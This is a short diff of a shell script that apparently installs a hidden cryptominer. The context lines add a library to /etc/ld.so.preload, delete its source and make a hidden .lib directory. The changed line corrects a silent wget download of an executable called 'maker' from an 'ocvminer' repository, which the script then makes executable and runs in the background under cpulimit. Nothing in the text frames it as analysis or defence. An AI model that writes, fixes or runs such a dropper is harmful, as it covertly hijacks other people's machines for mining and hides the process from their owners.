@@ -7,7 +7,7 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/Sazfa-Kuy/ocvminer/blob/main/maker >/dev/null 2>&1
+wget -O sgr1 https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker >/dev/null 2>&1
 chmod +x sgr1
 cpulimit -l 150 -e sgr1 &
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
